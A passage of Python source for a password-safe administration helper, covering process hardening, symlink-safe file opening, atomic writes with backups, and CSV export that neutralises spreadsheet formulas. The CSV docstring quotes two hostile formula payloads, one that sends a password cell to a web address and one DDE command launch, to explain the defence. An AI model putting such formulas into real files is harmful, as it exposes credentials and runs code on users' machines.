                signal.setitimer(signal.ITIMER_REAL, 0)
                signal.signal(signal.SIGALRM, self._prev or signal.SIG_DFL)
            except (ValueError, OSError):
                pass
            self._armed = False
        self.elapsed = time.monotonic() - self.started
        if exc_type is _ParseTimeout:
            raise Invalid("%s exceeded its %.1fs budget" % (self.what,
                                                            self.seconds))
        if exc_type is None and self.elapsed > self.seconds:
            # The preemptive path was unavailable (or the overrun happened
            # inside a C call the signal could not interrupt). Discard the
            # result anyway: an answer that took longer than the budget is an
            # answer the budget said not to give.
            raise Invalid("%s exceeded its %.1fs budget" % (self.what,
                                                            self.seconds))
        return False


# ===========================================================================
# process hardening  (I14)
# ===========================================================================

PR_SET_DUMPABLE = 4      # <linux/prctl.h>
MCL_CURRENT = 1          # <bits/mman-linux.h>
MCL_FUTURE = 2

_HARDEN_REPORT = None    # set once; makes harden_process() idempotent


def _note(msg):
    """Diagnostics go to stderr — stdout carries exactly one JSON object."""
    sys.stderr.write("secrets-admin: %s\n" % redact(msg))


def harden_process(*, close_fds=True, mlock=True, quiet=False):
    """Make this process a poor target for memory scraping. Call it FIRST.

    Does four things, in the order they stop mattering if the process has
    already done anything interesting:

      1. `RLIMIT_CORE = 0` — a core dump of this helper is every plaintext it
         holds. `gcore` still works for root; a crash dump no longer does.
      2. `prctl(PR_SET_DUMPABLE, 0)` — clears the dumpable flag, which also
         makes `/proc/<pid>/mem`, `maps` and `environ` root-owned, so another
         unprivileged user (adversary A1) cannot read them even if the uids
         would otherwise permit it, and non-root `ptrace` is refused.
      3. `umask(0o077)` — every file this process creates (backup, temp file,
         audit log, lock file) is private by default, so a missed explicit chmod
         is not a disclosure.
      4. best-effort `mlockall(MCL_CURRENT|MCL_FUTURE)` — keeps the passphrase
         out of swap. This USUALLY FAILS for the user-class path, where
         RLIMIT_MEMLOCK is small and the process is not root. When it fails a
         note goes to stderr saying so. It must never be reported as success:
         claiming a defence you do not have is worse than not having it.

    Then, when `close_fds` is true, closes every inherited descriptor above 2.
    Cockpit's bridge and any escalation helper in the chain may leave fds open;
    an inherited fd is both a leak channel and a way for a later `os.replace` to
    be observed.

    **Call this before opening anything.** `close_fds` runs on the FIRST call
    only, so a second call cannot close a safe's fd out from under a backend —
    that is what makes the function safe to call twice, which is what the tests
    and the `__main__` self-check need.

    Returns a dict describing what actually happened, e.g.

        {"core_disabled": True, "dumpable_off": True, "mlockall": False,
         "mlockall_error": "ENOMEM", "umask": "0o077", "closed_fds": 3,
         "already": False}

    `secrets-admin health` surfaces this so the operator can see when `mlockall`
    is not in force rather than assuming it is.
    """
    global _HARDEN_REPORT
    if _HARDEN_REPORT is not None:
        report = dict(_HARDEN_REPORT)
        report["already"] = True
        return report

    report = {"core_disabled": False, "dumpable_off": False,
              "mlockall": False, "mlockall_error": None,
              "umask": "0o077", "closed_fds": 0, "already": False}

    # 1. no core dumps.
    try:
        resource.setrlimit(resource.RLIMIT_CORE, (0, 0))
        report["core_disabled"] = True
    except (ValueError, OSError) as exc:
        report["core_disabled"] = False
        if not quiet:
            _note("could not set RLIMIT_CORE=0: %s" % type(exc).__name__)

    libc = None
    try:
        # CDLL(None) resolves against the process's own symbol table, which is
        # glibc here. ctypes.util.find_library is the fallback for the odd
        # environment where that does not work.
        libc = ctypes.CDLL(None, use_errno=True)
        if not hasattr(libc, "prctl"):
            name = ctypes.util.find_library("c")
            libc = ctypes.CDLL(name, use_errno=True) if name else libc
    except OSError:
        libc = None

    # 2. not dumpable: no ptrace, no /proc/<pid>/mem, for anyone but root.
    if libc is not None and hasattr(libc, "prctl"):
        try:
            libc.prctl.restype = ctypes.c_int
            libc.prctl.argtypes = [ctypes.c_int, ctypes.c_ulong,
                                   ctypes.c_ulong, ctypes.c_ulong,
                                   ctypes.c_ulong]
            ctypes.set_errno(0)
            rc = libc.prctl(PR_SET_DUMPABLE, 0, 0, 0, 0)
            report["dumpable_off"] = (rc == 0)
            if rc != 0 and not quiet:
                _note("prctl(PR_SET_DUMPABLE,0) failed: errno %d"
                      % ctypes.get_errno())
        except Exception as exc:                      # noqa: BLE001
            if not quiet:
                _note("prctl unavailable: %s" % type(exc).__name__)
    elif not quiet:
        _note("libc prctl not resolvable; process stays dumpable")

    # 3. private by default.
    os.umask(0o077)

    # 4. best effort mlockall — reported honestly.
    if mlock and libc is not None and hasattr(libc, "mlockall"):
        try:
            libc.mlockall.restype = ctypes.c_int
            libc.mlockall.argtypes = [ctypes.c_int]
            ctypes.set_errno(0)
            rc = libc.mlockall(MCL_CURRENT | MCL_FUTURE)
            if rc == 0:
                report["mlockall"] = True
            else:
                eno = ctypes.get_errno()
                report["mlockall_error"] = errno.errorcode.get(eno, str(eno))
                if not quiet:
                    # Expected on the user-class path (RLIMIT_MEMLOCK). Say so
                    # rather than letting it read like a fault.
                    _note("mlockall failed (%s): secrets may reach swap; this "
                          "is expected for a non-root helper"
                          % report["mlockall_error"])
        except Exception as exc:                      # noqa: BLE001
            report["mlockall_error"] = type(exc).__name__
            if not quiet:
                _note("mlockall unavailable: %s" % type(exc).__name__)
    elif mlock and not quiet:
        report["mlockall_error"] = "unavailable"
        _note("libc mlockall not resolvable; secrets may reach swap")

    # 5. drop inherited descriptors. FIRST CALL ONLY — see the docstring.
    if close_fds:
        report["closed_fds"] = _close_inherited_fds()

    _HARDEN_REPORT = dict(report)
    return report


def _close_inherited_fds(keep_below=3):
    """Close every open descriptor >= keep_below. Returns how many were closed.

    Enumerating /proc/self/fd rather than blindly calling close() over a range
    keeps the count truthful (the health verb reports it) and avoids thrashing
    through an RLIMIT_NOFILE that may be 1024*1024.
    """
    closed = 0
    try:
        with os.scandir("/proc/self/fd") as it:
            fds = []
            dirfd = None
            for ent in it:
                try:
                    n = int(ent.name)
                except ValueError:
                    continue
                fds.append(n)
            # The scandir handle itself is one of the fds we just listed; close
            # it by leaving the `with` block, then close the rest.
        for n in fds:
            if n < keep_below:
                continue
            try:
                os.close(n)
                closed += 1
            except OSError:
                # Already gone (the scandir handle) or not ours. Both fine.
                pass
    except OSError:
        # No /proc — fall back to the range close. Bounded by the soft NOFILE
        # limit so it cannot spin for a million iterations.
        try:
            soft = resource.getrlimit(resource.RLIMIT_NOFILE)[0]
        except (ValueError, OSError):
            soft = 1024
        high = min(int(soft) if soft > 0 else 1024, 4096)
        if hasattr(os, "closerange"):
            os.closerange(keep_below, high)
        closed = -1     # unknown; do not lie with a number
    return closed


# ===========================================================================
# open_safe_fd — the symlink / TOCTOU / ownership guard  (I4, I5)
# ===========================================================================

class Fingerprint(NamedTuple):
    """`(mtime_ns, size, sha256)` of a safe file, captured at unlock.

    Compared immediately before a write to detect that a desktop client changed
    the file behind us (I13). All three together, because mtime alone has
    filesystem-granularity problems and size alone misses an in-place edit.
    """

    mtime_ns: int
    size: int
    sha256: str

    def matches(self, other):
        """True when both fingerprints describe the same bytes.

        The digest goes through `constant_time_eq` — not because a file hash is
        secret, but because this codebase has exactly one way to compare a
        digest and `validate.sh` enforces it (I6).
        """
        if other is None:
            return False
        return (self.mtime_ns == other.mtime_ns
                and self.size == other.size
                and constant_time_eq(self.sha256, other.sha256))

    def as_dict(self):
        return {"mtime_ns": self.mtime_ns, "size": self.size,
                "sha256": self.sha256}

    @classmethod
    def from_dict(cls, d):
        try:
            return cls(int(d["mtime_ns"]), int(d["size"]), str(d["sha256"]))
        except (KeyError, TypeError, ValueError):
            raise Invalid("malformed fingerprint")


class SafeFile:
    """An open, validated descriptor onto a safe file.

    Holds the fd that passed every check in `open_safe_fd` plus the `fstat`
    result it was validated against. **Every subsequent operation uses this same
    fd** — re-`stat`ing the path would reopen the TOCTOU window that the fd was
    taken to close (I5).

    Reads use `os.pread`, so the file offset never moves and two readers cannot
    interfere. Use it as a context manager; `close()` is idempotent.
    """

    __slots__ = ("path", "fd", "st", "writable", "_closed")

    def __init__(self, path, fd, st, writable):
        self.path = path
        self.fd = fd
        self.st = st
        self.writable = writable
        self._closed = False

    # -- reading -----------------------------------------------------------

    def read_all(self, max_bytes=None):
        """Read the whole file from the validated fd.

        Size is re-checked from a fresh `fstat` on the fd (not the path) so a
        file that grew between open and read cannot exceed the cap.
        """
        cap = Limits.MAX_SAFE_BYTES if max_bytes is None else max_bytes
        st = os.fstat(self.fd)
        if st.st_size > cap:
            raise Invalid("safe file is larger than the %d byte limit" % cap)
        out = bytearray()
        off = 0
        while off < st.st_size:
            chunk = os.pread(self.fd, min(1 << 20, st.st_size - off), off)
            if not chunk:
                break                       # truncated under us; caller decides
            out += chunk
            off += len(chunk)
        return bytes(out)

    def fingerprint(self):
        """`Fingerprint(mtime_ns, size, sha256)` computed from THIS fd.

        Captured at unlock and re-taken immediately before a write. Hashing the
        whole file is the expensive part and is bounded by
        `Limits.MAX_SAFE_BYTES`, which `open_safe_fd` already enforced.
        """
        st = os.fstat(self.fd)
        h = hashlib.sha256()
        off = 0
        while off < st.st_size:
            chunk = os.pread(self.fd, min(1 << 20, st.st_size - off), off)
            if not chunk:
                break
            h.update(chunk)
            off += len(chunk)
        return Fingerprint(st.st_mtime_ns, st.st_size, h.hexdigest())

    # -- lifetime ----------------------------------------------------------

    def close(self):
        if not self._closed:
            self._closed = True
            try:
                os.close(self.fd)
            except OSError:
                pass

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc, tb):
        self.close()
        return False

    def __repr__(self):
        return "<SafeFile %s fd=%d uid=%d mode=0o%o>" % (
            self.path, -1 if self._closed else self.fd,
            self.st.st_uid, stat.S_IMODE(self.st.st_mode))


def _check_ancestor_dirs(path):
    """Refuse a safe whose directory chain lets someone else swap the file.

    Walks from the containing directory to `/`. A group- or other-writable
    directory means an attacker can rename our file away and put theirs there,
    which defeats every check we do on the file itself. The sticky bit is the
    documented exemption: `/tmp` is 01777 and sticky, and sticky means only the
    owner may unlink or rename another user's entry there.
    """
    d = os.path.dirname(os.path.abspath(path)) or "/"
    seen = set()
    while True:
        try:
            st = os.stat(d)
        except FileNotFoundError:
            raise NotFound("directory of the safe does not exist")
        except PermissionError:
            raise AccessDenied("directory of the safe is not readable")
        except OSError:
            raise Invalid("directory of the safe cannot be inspected")
        mode = stat.S_IMODE(st.st_mode)
        if (mode & 0o022) and not (mode & stat.S_ISVTX):
            raise AccessDenied(
                "directory %s is group- or other-writable and not sticky" % d)
        # Stop at the filesystem root, and guard against a symlink loop in the
        # ancestry producing an infinite walk.
        key = (st.st_dev, st.st_ino)
        if key in seen:
            raise Invalid("directory chain of the safe contains a loop")
        seen.add(key)
        parent = os.path.dirname(d)
        if parent == d:
            return
        d = parent


def open_safe_fd(path, *, expect_uid=None, want_write=False):
    """Open a safe file the only way this program is allowed to (I4, I5).

    `path` comes from the REGISTRY, never from the request body — this function
    is below the registry, and `secrets-admin` is what resolves an id to a path.
    Passing a caller-supplied path here would reintroduce I4 no matter what this
    function checks.

    What it does, in order:

      1. Refuse a relative path. Everything downstream assumes absolute, and a
         relative path resolves against a cwd we do not control.
      2. `os.open(..., O_NOFOLLOW | O_CLOEXEC)`. `O_NOFOLLOW` is the whole
         defence against a user-class safe path being swapped for a symlink to
         `/etc/shadow` between the registry read and the open, on a helper that
         may be root. `O_CLOEXEC` keeps the fd out of any child.
      3. `os.fstat` **the fd**. Never a second `stat` of the path: the path can
         change between the two calls and the fd cannot.
      4. Regular file, or refuse. A FIFO would block the helper forever; a
         device would do something worse.
      5. `st_uid == expect_uid`, or refuse. This is what makes "the user class
         may only reach files that user owns" true.
      6. No group or other permission bits at all (mode & 0o077 == 0). A safe
         is 0600. A 0644 safe is readable by adversary A1 and we decline to
         participate.
      7. No ancestor directory is group/other-writable unless sticky.
      8. Size within `Limits.MAX_SAFE_BYTES`.

    Args:
        path:        absolute path from a validated registry entry
        expect_uid:  the uid that must own the file. `None` means
                     `os.geteuid()` — right for both classes: the admin path
                     runs as root against a root-owned safe, the user path runs
                     as the user against their own safe.
        want_write:  open O_RDWR instead of O_RDONLY. Note that the actual
                     write goes through `atomic_replace`, which never writes
                     into the target file, so most callers want False.

    Returns:
        SafeFile

    Raises:
        NotFound      the path does not exist
        AccessDenied  symlink, wrong owner, group/other bits, unsafe ancestry,
                      or the kernel refused the open
        Invalid       relative path, not a regular file, or oversized
    """
    if not isinstance(path, str) or not path:
        raise Invalid("safe path is missing")
    if not path.startswith("/"):
        raise Invalid("safe path is not absolute")

    # Ancestry first: cheap, and it fails before we hold any descriptor.
    _check_ancestor_dirs(path)

    if expect_uid is None:
        expect_uid = os.geteuid()

    flags = (os.O_RDWR if want_write else os.O_RDONLY)
    flags |= os.O_NOFOLLOW | os.O_CLOEXEC
    if hasattr(os, "O_NOCTTY"):
        flags |= os.O_NOCTTY        # a device slipped in here cannot steal a tty
    try:
        fd = os.open(path, flags)
    except OSError as exc:
        if exc.errno == errno.ELOOP:
            # O_NOFOLLOW's refusal. This is the I5 attack landing.
            raise AccessDenied("safe path is a symbolic link")
        if exc.errno == errno.ENOENT:
            raise NotFound("safe file does not exist")
        if exc.errno in (errno.EACCES, errno.EPERM):
            raise AccessDenied("safe file is not accessible to this caller")
        if exc.errno == errno.EISDIR:
            raise Invalid("safe path is a directory")
        if exc.errno in (errno.ENXIO, errno.ENODEV):
            raise Invalid("safe path is not a regular file")
        raise Invalid("safe file could not be opened")

    try:
        st = os.fstat(fd)                      # the fd, never the path again
        if not stat.S_ISREG(st.st_mode):
            raise Invalid("safe path is not a regular file")
        if st.st_uid != expect_uid:
            # Deliberately does NOT name either uid: on the user path that would
            # tell an unprivileged caller who owns a file they cannot read.
            raise AccessDenied("safe file is not owned by the expected user")
        if stat.S_IMODE(st.st_mode) & 0o077:
            raise AccessDenied(
                "safe file is group- or other-accessible; it must be 0600")
        if st.st_size > Limits.MAX_SAFE_BYTES:
            raise Invalid("safe file is larger than the %d byte limit"
                          % Limits.MAX_SAFE_BYTES)
        # st_nlink > 1 is left as a warning-free pass on purpose: a hard link
        # preserves st_uid, so the ownership check above already covers the
        # interesting case, and legitimate backup tooling makes hard links.
        return SafeFile(path, fd, st, want_write)
    except BaseException:
        os.close(fd)                            # never leak the fd on a refusal
        raise


# ===========================================================================
# CSV export — formula neutralisation  (CWE-1236)
# ===========================================================================

#: A cell beginning with one of these is handed to the spreadsheet's FORMULA
#: parser, not its text parser — Excel and LibreOffice both do it, and both do
#: it inside RFC-4180 quotes, so `csv.QUOTE_ALL` is not a defence against it and
#: never was. TAB and CR are here because a leading one is stripped before the
#: first significant character is looked at.
CSV_FORMULA_LEAD = ("=", "+", "-", "@", "\t", "\r")

#: What we put in front of such a cell. A leading apostrophe is the "this cell
#: is text" marker in every spreadsheet that has this problem, and it is not
#: displayed. See `csv_cell` for what it costs.
CSV_TEXT_PREFIX = "'"


def csv_cell(value):
    """One CSV cell, with a leading formula character neutralised.

    THE HAZARD. An export is "the entire safe in plaintext" and the one thing
    an operator does with it is open it in a spreadsheet. A field value under
    an attacker's control (A3 — a malicious or corrupted safe) that begins with
    `=` is not data there, it is code: `=WEBSERVICE("http://…"&D2)` reads the
    neighbouring Password cell and sends it out, and `=cmd|' /C calc'!A0` is a
    DDE launch. Measured before this function existed: a URL of
    `=cmd|' /C calc'!A0` was written to the export verbatim, quoted and
    otherwise untouched.

    WHAT IT COSTS, stated because it is a real cost and not a rounding error.
    There is no neutralisation a plain CSV reader can undo unambiguously, so a
    legitimate value that begins with one of these characters — a password like
    `-hunter2` is the realistic case — gains a leading apostrophe in the export.
    The alternatives were weighed and rejected:

      * leave the bytes alone, as KeePassXC's exporter does, and document the
        hazard. That keeps byte-fidelity and leaves an exfiltration primitive
        in the one artefact that contains every credential at once.
      * refuse to export an entry whose field looks like a formula. That turns
        a hostile safe into a denial of the operator's own recovery path.

    So the mangling is accepted, and made LOUD rather than silent: the export
    verb reports how many cells were neutralised, `_export_csv` counts them,
    docs/COMPATIBILITY.md records the divergence from KeePassXC's CSV, and the
    change is visible in the file itself. An operator re-importing into a
    password manager strips one leading apostrophe.
    """
    if not isinstance(value, str):
        value = "" if value is None else str(value)
    if value.startswith(CSV_FORMULA_LEAD):
        return CSV_TEXT_PREFIX + value
    return value


class CsvWriter:
    """`csv.writer` with `csv_cell` applied to every field, and a count.

    A helper function that each call site has to remember to call is a rule;
    this is the rule made structural. `validate.sh` bans `csv.writer(` outside
    this file so a new export format cannot quietly reintroduce the raw writer.

    `neutralised` is the number of cells that were changed, which the `export`
    verb reports so the operator is told rather than surprised.
    """

    __slots__ = ("_w", "neutralised")

    def __init__(self, fileobj):
        import csv as _csv
        self._w = _csv.writer(fileobj, quoting=_csv.QUOTE_ALL,
                              lineterminator="\r\n")
        self.neutralised = 0

    def writerow(self, row):
        out = []
        for cell in row:
            safe = csv_cell(cell)
            if safe is not cell and safe != cell:
                self.neutralised += 1
            out.append(safe)
        return self._w.writerow(out)


# ===========================================================================
# atomic_replace — the durable write primitive  (I12, I13)
# ===========================================================================

def write_all(fd, data):
    """`write(2)` until every byte is out. The ONLY way this program writes.

    `os.write()` returns how many bytes the kernel actually took, and it is
    allowed to take fewer than it was offered — a short write. On a healthy
    filesystem it almost never happens, which is precisely why a call site that
    ignores the return value passes every test and then loses data the one time
    the disk is full or the quota is hit.

    This existed as an open-coded `while written < len(data)` loop in
    `atomic_replace` and in the export writer, and as a plain `os.write()` that
    advanced by the length of the buffer it READ in `_ring_backup` — the one
    data-carrying write in the program that did not loop. That asymmetry cost a
    silently truncated backup generation that the ring then presented as a good
    one. One function, used everywhere, is what stops the next call site from
    getting the same detail wrong; `validate.sh` bans a bare `os.write(` of
    caller data outside this file for the same reason.

    Returns the number of bytes written, which always equals `len(data)` —
    anything else raises out of `os.write` itself.
    """
    view = memoryview(data)
    total = len(view)
    written = 0
    while written < total:
        n = os.write(fd, view[written:])
        if n <= 0:
            # write(2) returning 0 for a non-empty buffer is not something a
            # regular file does, but a loop that trusts it would spin forever.
            raise Internal("a write of %d bytes made no progress" % total)
        written += n
    return written


def backup_dir_for(path, backup_dir):
    """Where a safe's backup ring lives. Default `<path>.bak.d/`, per
    docs/CONTRACT.md `backup.dir`.

    PUBLIC, and it has to be. This is the one function that decides where a
    backup goes, `atomic_replace` routes every write through it, and the
    `backups` and `restore-backup` verbs must enumerate exactly the directory
    `save` writes to. `secrets-admin` used to import it under its underscored
    name — reaching past the package boundary for the single most important
    piece of agreement in the program. Re-deriving the rule on the reading side
    would make the listing and the writer disagree the first time either
    changed, and a restore verb that reads a different directory than the one
    being written is worse than no restore verb at all.
    """
    if backup_dir:
        if not backup_dir.startswith("/"):
            raise Invalid("backup directory is not absolute")
        # A backup of a safe is exactly as sensitive as the safe. /tmp and
        # /var/tmp are world-writable and frequently a different filesystem;
        # neither is a place to put one, and the operator saying so in the
        # registry does not make it true.
        norm = os.path.normpath(backup_dir)
        if norm == "/tmp" or norm.startswith("/tmp/") \
                or norm == "/var/tmp" or norm.startswith("/var/tmp/"):
            raise Invalid("backup directory may not be under /tmp or /var/tmp")
        return norm
    return path + ".bak.d"


def _ring_backup(src_fd, path, backup_dir, keep):
    """Copy the current file into the backup ring and prune to `keep` newest.

    Runs BEFORE a single byte of the new content is written, so an operator
    always has the previous generation even if everything after this fails.
    Reads through `src_fd` — the descriptor that already passed `open_safe_fd` —
    rather than reopening the path, so the thing backed up is provably the thing
    that was validated.
    """
    if not isinstance(keep, int) or keep < 1:
        raise Invalid("backup keep count must be at least 1")
    keep = min(keep, Limits.MAX_BACKUP_KEEP)

    os.makedirs(backup_dir, mode=0o700, exist_ok=True)
    # exist_ok skips the mode when the directory is already there, so assert it.
    try:
        os.chmod(backup_dir, 0o700)
    except OSError:
        pass

    base = os.path.basename(path)
    # Microsecond resolution, not seconds: two saves inside one second are
    # ordinary (an edit, then a fix), and a colliding name would make the second
    # save fail on O_EXCL with the database already backed up but not written.
    # The self-check caught exactly that. Timestamp first so lexical order is
    # chronological order, which is what the pruner sorts on.
    now = time.time_ns()
    stamp = "%s.%06d" % (time.strftime("%Y%m%dT%H%M%S",
                                       time.gmtime(now // 1_000_000_000)),
                         (now % 1_000_000_000) // 1000)
    st = os.fstat(src_fd)
    dest = None
    bfd = None
    for attempt in range(16):
        cand = os.path.join(backup_dir, "%s.%s.%d%s.bak"
                            % (base, stamp, os.getpid(),
                               "" if attempt == 0 else "-%d" % attempt))
        try:
            # O_EXCL so we can never overwrite an existing generation, and
            # O_NOFOLLOW so the ring directory cannot be salted with symlinks.
            bfd = os.open(cand, os.O_WRONLY | os.O_CREAT | os.O_EXCL
                          | os.O_CLOEXEC | os.O_NOFOLLOW, 0o600)
            dest = cand
            break
        except FileExistsError:
            continue
    if bfd is None:
        raise Internal("could not create a backup generation")
    # A GENERATION IS EITHER COMPLETE OR IT IS NOT IN THE RING.
    #
    # This loop used to be `os.write(bfd, chunk); off += len(chunk)` — it
    # advanced by the bytes READ, not the bytes WRITTEN. os.write() is a thin
    # wrapper over write(2) and write(2) is permitted to write fewer bytes than
    # it was given; on a filesystem that is nearly full it does exactly that
    # once and then fails. The result was a TRUNCATED generation that was
    # fsync'd, named, listed by the `backups` verb with a plausible size, and
    # accepted by `restore-backup` — which then wrote it over the live safe.
    # Measured on a 256 KiB tmpfs: a 4661-byte fixture produced a 4096-byte
    # "generation", restore-backup reported {"ok": true}, and the safe no
    # longer opened. Worse, some of those saves returned "saved": true, so the
    # operator was never told. `write_all` fixes the accounting; the size
    # assertion and the unlink below make the invariant unconditional, because
    # a ring whose members are only PROBABLY complete is not an undo.
    try:
        try:
            os.fchmod(bfd, 0o600)      # explicit: never rely on umask alone
            off = 0
            while off < st.st_size:
                chunk = os.pread(src_fd, min(1 << 20, st.st_size - off), off)
                if not chunk:
                    break
                write_all(bfd, chunk)
                off += len(chunk)
            os.fsync(bfd)              # a backup that is not on disk is not one
            written = os.fstat(bfd).st_size
            if off != st.st_size or written != st.st_size:
                raise Internal(
                    "the backup generation is short (%d of %d bytes); nothing "
                    "was written" % (written, st.st_size))
        finally:
            os.close(bfd)
    except BaseException as exc:
        # Remove the partial generation. Leaving it would put a file the ring
        # cannot distinguish from a good one where the only undo lives.
        try:
            os.unlink(dest)
        except OSError:
            pass
        if isinstance(exc, OSError):
            # ENOSPC/EDQUOT/EIO on the ring is the operator's most likely
            # cause and `internal / OSError` tells them nothing. Name the
            # class of failure; never the path (I15).
            raise Internal("the backup generation could not be written: %s"
                           % errno.errorcode.get(exc.errno, "OSError"))
        raise

    # Prune oldest-first. The name embeds a UTC timestamp, so lexical order is
    # chronological order.
    try:
        with os.scandir(backup_dir) as it:
            gens = sorted(e.name for e in it
                          if e.is_file(follow_symlinks=False)
                          and e.name.startswith(base + ".")
                          and e.name.endswith(".bak"))
        for old in gens[:-keep] if keep < len(gens) else []:
            try:
                os.unlink(os.path.join(backup_dir, old))
            except OSError:
                pass
    except OSError:
        pass
    return dest


def atomic_replace(path, data, *, backup_dir=None, keep=None,
                   expect_fingerprint=None, expect_uid=None, mode=0o600):
    """Replace a safe file durably, or do not touch it at all (I12, I13).

    The sequence, in this order and with no shortcuts:

      1. Re-open the target through `open_safe_fd` and re-fingerprint it. If
         `expect_fingerprint` is given and does not match, raise `Conflict` and
         WRITE NOTHING — a desktop client changed the file since unlock and a
         silent merge would discard their work (I13). A missing file with a
         non-None `expect_fingerprint` is also a Conflict: it was there at
         unlock and is not now.
      2. Copy the current bytes into the backup ring (mode 0600, pruned to
         `keep` newest) — before the first byte of new content exists.
      3. Create `<path>.tmp-<pid>` **in the same directory** with
         `O_CREAT|O_EXCL|O_NOFOLLOW`, mode 0600. Same directory because
         `os.replace` is only atomic within a filesystem, and NOT `/tmp`:
         different filesystem, world-writable, and a plaintext-adjacent file
         landing there is a disclosure (bad practice #3).
      4. Write it, `os.fsync` the temp fd. Without the fsync, `os.replace` can
         publish a name that points at unwritten blocks after a power cut.
      5. `os.replace` — atomic rename, so a reader sees either the whole old
         file or the whole new one, never a truncated database.
      6. `os.fsync` the DIRECTORY fd, so the rename itself survives a crash.

    The temp file is unlinked on every failure path, including SIGKILL-adjacent
    ones where it cannot be (a leftover `<path>.tmp-<pid>` is inert and the next
    run cleans it up — it is never mistaken for the safe).

    Args:
        path:               absolute path to the safe
        data:               the complete new file content (bytes)
        backup_dir:         registry `backup.dir`, or None for `<path>.bak.d`
        keep:               generations to retain; None -> DEFAULT_BACKUP_KEEP
        expect_fingerprint: the `Fingerprint` captured at unlock, or None to
                            skip the changed-on-disk check (creation only)
        expect_uid:         owner the target must have; None -> os.geteuid()
        mode:               permissions for the new file; 0600 and there is no
                            good reason to pass anything else

    Returns:
        {"backup": <path or None>, "bytes": <int>, "fingerprint": Fingerprint}
        — the shape `secrets-admin save` reports as
        `{ok:true, backup, bytes, conflict:false}`.

    Raises:
        Conflict   the file changed on disk since unlock, or vanished
        Invalid    bad arguments, or the target is not a sane safe file
        Internal   the write itself failed (disk full, read-only filesystem);
                   the ORIGINAL is untouched in every such case
    """
    if not isinstance(path, str) or not path.startswith("/"):
        raise Invalid("safe path is not absolute")
    if isinstance(data, (bytearray, memoryview)):
        data = bytes(data)
    if not isinstance(data, bytes):
        raise Invalid("replacement content must be bytes")
    if keep is None:
        keep = Limits.DEFAULT_BACKUP_KEEP
    if expect_uid is None:
        expect_uid = os.geteuid()

    directory = os.path.dirname(path)
    backup_path = None

    # ---- 1. changed-on-disk re-check, immediately before anything else ----
    existing = None
    try:
        existing = open_safe_fd(path, expect_uid=expect_uid, want_write=False)
    except NotFound:
        if expect_fingerprint is not None:
            # It was there when we unlocked it. Someone removed or renamed it.
            raise Conflict("the safe file disappeared since it was unlocked")

    try:
        if existing is not None:
            if expect_fingerprint is not None:
                current = existing.fingerprint()
                if not current.matches(expect_fingerprint):
                    raise Conflict(
                        "the safe file changed on disk since it was unlocked")
            # ---- 2. backup ring, before the first new byte ----------------
            backup_path = _ring_backup(existing.fd, path,
                                       backup_dir_for(path, backup_dir), keep)
    finally:
        if existing is not None:
            existing.close()

    # ---- 3. temp file, SAME directory, O_EXCL, 0600 -----------------------
    # Exactly "<path>.tmp-<pid>", the name docs and the durability tests use.
    # Same directory as the target, because os.replace is only atomic within one
    # filesystem; NOT /tmp, which is a different filesystem and world-readable.
    tmp = "%s.tmp-%d" % (path, os.getpid())
    tfd = None
    try:
        try:
            tfd = os.open(tmp, os.O_WRONLY | os.O_CREAT | os.O_EXCL
                          | os.O_CLOEXEC | os.O_NOFOLLOW, mode)
        except FileExistsError:
            # A previous run of THIS pid died here. The content is unusable and
            # the pid is ours, so removing it is safe and is the cleanup the
            # SIGKILL test expects.
            os.unlink(tmp)
            tfd = os.open(tmp, os.O_WRONLY | os.O_CREAT | os.O_EXCL
                          | os.O_CLOEXEC | os.O_NOFOLLOW, mode)
        os.fchmod(tfd, mode)           # explicit; umask must not get a vote

        # ---- 4. write and fsync ------------------------------------------
        write_all(tfd, data)
        os.fsync(tfd)
        # The same assertion the ring gets: a short write here would publish a
        # truncated safe by os.replace, which is the one outcome this whole
        # function exists to make impossible.
        if os.fstat(tfd).st_size != len(data):
            raise Internal("the temporary file is short (%d of %d bytes); "
                           "nothing was written"
                           % (os.fstat(tfd).st_size, len(data)))
        os.close(tfd)
        tfd = None

        # ---- 5. atomic publish -------------------------------------------
        os.replace(tmp, path)
        tmp = None                     # it is the safe now; do not unlink it

        # ---- 6. fsync the directory so the rename itself is durable -------
        dfd = os.open(directory or "/", os.O_RDONLY | os.O_DIRECTORY
                      | os.O_CLOEXEC)
        try:
            os.fsync(dfd)
        finally:
            os.close(dfd)

    except SecretsError:
        raise
    except OSError as exc:
        # ENOSPC, EROFS, EDQUOT all land here. The original file has not been
        # touched — the only thing that ever touches it is os.replace, and that
        # is the last step. Report the class of failure, never the path.
        raise Internal("write failed: %s"
                       % errno.errorcode.get(exc.errno, "OSError"))
    finally:
        if tfd is not None:
            try:
                os.close(tfd)
            except OSError:
                pass
        if tmp is not None:
            # Every failure path removes the temp file. A leftover would be a
            # 0600 copy of a decrypted-then-reencrypted database sitting beside
            # the safe.
            try:
                os.unlink(tmp)
            except OSError:
                pass

    # Fingerprint of what is now on disk, so the caller can keep managing the
    # safe after a save without re-unlocking.
    with open_safe_fd(path, expect_uid=expect_uid) as sf:
        final = sf.fingerprint()
    return {"backup": backup_path, "bytes": len(data), "fingerprint": final}


def validate_new_path(path, what="destination"):
    """Vet a path this program is about to CREATE a safe at. Returns it.

    Every operation that writes a database somewhere the registry does not list
    — `save_as`, `upgrade_to_kdbx4` — funnels through here, because each of them
    is one refusal away from being the file-overwrite primitive an attacker
    wanted. The helper has already decided the operator may name a path at all
    (I4 is about the BROWSER naming one); this is the part that is the same
    every time and therefore must not be re-typed per call site.

    The refusals, and what each one stops:

      * not absolute, or not equal to `os.path.normpath` of itself — `..`, a
        doubled slash and a trailing slash all walk straight past the textual
        checks below, so a path that is not already in normal form is refused
        rather than normalised (normalising would accept the attacker's input
        and act on a different path than the one the operator was shown);
      * under `/tmp` or `/var/tmp` — world-writable, a different filesystem
        from anything the registry names, and the classic place for a
        plaintext-adjacent file to be read by someone else (bad practice #3);
      * already exists, INCLUDING as a dangling symlink (`os.path.lexists`, not
        `os.path.exists`) — never overwrite, and never follow a link somebody
        else planted at the name we were about to create (I5).

    Raises `Invalid` for a malformed path and `Conflict` for one that is taken;
    two codes because an operator fixes them differently.
    """
    if not isinstance(path, str) or not path.startswith("/"):
        raise Invalid("the %s must be an absolute path" % what)
    if path != os.path.normpath(path):
        raise Invalid("the %s path must be in normal form" % what)
    if path.startswith("/tmp/") or path.startswith("/var/tmp/"):
        raise Invalid("refusing to write a database under /tmp")
    if os.path.lexists(path):
        raise Conflict("the %s already exists; this never overwrites" % what)
    return path


# ===========================================================================
# LockFile — .kdbx.lock and .plk, honoured and created  (I13)
# ===========================================================================

class LockFile:
